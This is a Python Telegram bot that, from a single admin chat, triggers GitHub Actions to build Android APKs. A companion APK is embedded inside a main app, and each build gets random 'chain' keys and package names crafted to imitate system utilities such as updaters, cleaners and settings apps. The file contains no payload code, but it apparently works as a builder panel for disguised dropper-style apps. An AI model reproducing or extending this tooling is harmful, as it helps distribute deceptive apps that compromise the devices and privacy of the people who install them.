import telebot
import random
import string
import requests
import json
import os
from datetime import datetime
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ════════════════════════════════════════════════════════
# CONFIGURATION — SET THESE AS GITHUB SECRETS
# ════════════════════════════════════════════════════════

BOT_TOKEN     = os.environ["TELEGRAM_BOT_TOKEN"]
ADMIN_CHAT_ID = int(os.environ["TELEGRAM_CHAT_ID"])
GITHUB_TOKEN  = os.environ["GH_PAT"]
GITHUB_REPO   = os.environ["REPO_NAME"]   # format: owner/repo-name

bot = telebot.TeleBot(BOT_TOKEN)

BUILDS_LOG = "builds_log.json"

# ════════════════════════════════════════════════════════
# GENERATION HELPERS
# ════════════════════════════════════════════════════════

def generate_chain():
    """Generate two unique 10-char alphanumeric chain parts."""
    chars = string.ascii_uppercase + string.digits
    part1 = ''.join(random.choices(chars, k=10))
    part2 = ''.join(random.choices(chars, k=10))
    return part1, part2

def generate_package():
    """Generate a realistic-looking random package name."""
    prefixes  = ["com", "org", "net"]
    companies = ["settings", "system", "manager", "service", "helper",
                 "assistant", "optimizer", "updater", "cleaner", "support"]
    prefix  = random.choice(prefixes)
    company = random.choice(companies)
    suffix  = ''.join(random.choices(string.ascii_lowercase, k=4))
    return f"{prefix}.{company}.{suffix}"

# ════════════════════════════════════════════════════════
# GITHUB ACTIONS TRIGGER
# ════════════════════════════════════════════════════════

def trigger_workflow(workflow_file, inputs: dict) -> bool:
    """Trigger a GitHub Actions workflow via API."""
    url = f"https://api.github.com/repos/{GITHUB_REPO}/actions/workflows/{workflow_file}/dispatches"
    headers = {
        "Authorization": f"Bearer {GITHUB_TOKEN}",
        "Accept": "application/vnd.github+json",
        "X-GitHub-Api-Version": "2022-11-28"
    }
    payload = {"ref": "main", "inputs": inputs}
    response = requests.post(url, headers=headers, json=payload)
    return response.status_code == 204

# ════════════════════════════════════════════════════════
# BUILD LOG
# ════════════════════════════════════════════════════════

def log_build(build_type, part1, part2, main_pkg, companion_pkg):
    builds = []
    if os.path.exists(BUILDS_LOG):
        try:
            with open(BUILDS_LOG, 'r') as f:
                builds = json.load(f)
        except Exception:
            builds = []
    builds.append({
        "timestamp":        datetime.now().isoformat(),
        "build_type":       build_type,
        "part1":            part1,
        "part2":            part2,
        "main_package":     main_pkg,
        "companion_package": companion_pkg
    })
    with open(BUILDS_LOG, 'w') as f:
        json.dump(builds, f, indent=2)

# ════════════════════════════════════════════════════════
# MAIN MENU
# ════════════════════════════════════════════════════════

def main_menu():
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("🔨 Build Main App", callback_data="build_main"))
    markup.row(InlineKeyboardButton("🔧 Build Companion App", callback_data="build_companion"))
    markup.row(InlineKeyboardButton("🔨🔧 Build Both", callback_data="build_both"))
    markup.row(InlineKeyboardButton("📋 List Builds", callback_data="list_builds"))
    return markup

# ════════════════════════════════════════════════════════
# /start COMMAND
# ════════════════════════════════════════════════════════

@bot.message_handler(commands=['start'])
def cmd_start(message):
    if message.chat.id != ADMIN_CHAT_ID:
        bot.reply_to(message, "❌ Unauthorized")
        return
    bot.send_message(
        ADMIN_CHAT_ID,
        "🤖 *Builder Bot*\n\nSelect an action:",
        parse_mode="Markdown",
        reply_markup=main_menu()
    )

# ════════════════════════════════════════════════════════
# CALLBACK HANDLERS
# ════════════════════════════════════════════════════════

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if call.message.chat.id != ADMIN_CHAT_ID:
        bot.answer_callback_query(call.id, "❌ Unauthorized")
        return

    bot.answer_callback_query(call.id)

    if call.data == "build_main":
        handle_build_main(call.message)

    elif call.data == "build_companion":
        handle_build_companion(call.message)

    elif call.data == "build_both":
        handle_build_both(call.message)

    elif call.data == "list_builds":
        handle_list_builds(call.message)

# ════════════════════════════════════════════════════════
# BUILD MAIN APP
# ════════════════════════════════════════════════════════

def handle_build_main(message):
    part1, part2 = generate_chain()
    main_pkg     = generate_package()
    companion_pkg = generate_package()

    bot.send_message(
        ADMIN_CHAT_ID,
        f"🔨 *BUILD MAIN APP STARTED*\n\n"
        f"📦 Main Package: `{main_pkg}`\n"
        f"🔐 Chain Part 1: `{part1}`\n\n"
        f"⏳ Triggering GitHub Actions...",
        parse_mode="Markdown"
    )

    inputs = {
        "main_package":      main_pkg,
        "companion_package": companion_pkg,
        "chain_part1":       part1,
        "chain_part2":       part2,
        "build_type":        "main"
    }

    if trigger_workflow("build_main.yml", inputs):
        log_build("main", part1, part2, main_pkg, companion_pkg)
        bot.send_message(
            ADMIN_CHAT_ID,
            f"✅ *Build triggered successfully*\n\n"
            f"📦 Main Package: `{main_pkg}`\n"
            f"🔐 Chain: `{part1}-{part2}`\n\n"
            f"⏳ Build takes 3–5 mins. APK will be sent here when ready.",
            parse_mode="Markdown",
            reply_markup=main_menu()
        )
    else:
        bot.send_message(
            ADMIN_CHAT_ID,
            "❌ Failed to trigger GitHub Actions. Check GITHUB_TOKEN and repo settings.",
            reply_markup=main_menu()
        )

# ════════════════════════════════════════════════════════
# BUILD COMPANION APP
# ════════════════════════════════════════════════════════

def handle_build_companion(message):
    part1, part2  = generate_chain()
    main_pkg      = generate_package()
    companion_pkg = generate_package()

    bot.send_message(
        ADMIN_CHAT_ID,
        f"🔧 *BUILD COMPANION APP STARTED*\n\n"
        f"📦 Companion Package: `{companion_pkg}`\n"
        f"🔐 Chain Part 2: `{part2}`\n\n"
        f"⏳ Triggering GitHub Actions...",
        parse_mode="Markdown"
    )

    inputs = {
        "main_package":      main_pkg,
        "companion_package": companion_pkg,
        "chain_part1":       part1,
        "chain_part2":       part2,
        "build_type":        "companion"
    }

    if trigger_workflow("build_companion.yml", inputs):
        log_build("companion", part1, part2, main_pkg, companion_pkg)
        bot.send_message(
            ADMIN_CHAT_ID,
            f"✅ *Companion build triggered*\n\n"
            f"📦 Companion Package: `{companion_pkg}`\n"
            f"🔐 Chain: `{part1}-{part2}`\n\n"
            f"⏳ Build takes 2–4 mins. APK will be sent here when ready.",
            parse_mode="Markdown",
            reply_markup=main_menu()
        )
    else:
        bot.send_message(
            ADMIN_CHAT_ID,
            "❌ Failed to trigger GitHub Actions.",
            reply_markup=main_menu()
        )

# ════════════════════════════════════════════════════════
# BUILD BOTH
# ════════════════════════════════════════════════════════

def handle_build_both(message):
    part1, part2  = generate_chain()
    main_pkg      = generate_package()
    companion_pkg = generate_package()

    bot.send_message(
        ADMIN_CHAT_ID,
        f"🔨🔧 *BUILD BOTH STARTED*\n\n"
        f"📦 Main Package: `{main_pkg}`\n"
        f"📦 Companion Package: `{companion_pkg}`\n"
        f"🔐 Chain Part 1: `{part1}`\n"
        f"🔐 Chain Part 2: `{part2}`\n\n"
        f"⏳ Triggering GitHub Actions...",
        parse_mode="Markdown"
    )

    inputs = {
        "main_package":      main_pkg,
        "companion_package": companion_pkg,
        "chain_part1":       part1,
        "chain_part2":       part2,
        "build_type":        "both"
    }

    if trigger_workflow("build_both.yml", inputs):
        log_build("both", part1, part2, main_pkg, companion_pkg)
        bot.send_message(
            ADMIN_CHAT_ID,
            f"✅ *Both builds triggered*\n\n"
            f"📦 Main: `{main_pkg}`\n"
            f"📦 Companion: `{companion_pkg}`\n"
            f"🔐 Chain: `{part1}-{part2}`\n\n"
            f"⏳ Build takes 5–8 mins.\n"
            f"Companion APK will be embedded in Main App assets.\n"
            f"Both APKs sent here when ready.",
            parse_mode="Markdown",
            reply_markup=main_menu()
        )
    else:
        bot.send_message(
            ADMIN_CHAT_ID,
            "❌ Failed to trigger GitHub Actions.",
            reply_markup=main_menu()
        )

# ════════════════════════════════════════════════════════
# LIST BUILDS
# ════════════════════════════════════════════════════════

def handle_list_builds(message):
    try:
        if not os.path.exists(BUILDS_LOG):
            bot.send_message(ADMIN_CHAT_ID, "📋 No builds yet.", reply_markup=main_menu())
            return
        with open(BUILDS_LOG, 'r') as f:
            builds = json.load(f)
        if not builds:
            bot.send_message(ADMIN_CHAT_ID, "📋 No builds yet.", reply_markup=main_menu())
            return
        text = "📋 *Last 10 Builds*\n\n"
        for i, b in enumerate(builds[-10:], 1):
            text += (
                f"*{i}.* `{b['timestamp'][:16]}` — {b['build_type'].upper()}\n"
                f"   Main: `{b['main_package']}`\n"
                f"   Companion: `{b['companion_package']}`\n"
                f"   Chain: `{b['part1']}-{b['part2']}`\n\n"
            )
        bot.send_message(ADMIN_CHAT_ID, text, parse_mode="Markdown", reply_markup=main_menu())
    except Exception as e:
        bot.send_message(ADMIN_CHAT_ID, f"❌ Error: {e}", reply_markup=main_menu())

# ════════════════════════════════════════════════════════
# START POLLING
# ════════════════════════════════════════════════════════

if __name__ == "__main__":
    print("Bot running...")
    bot.infinity_polling()
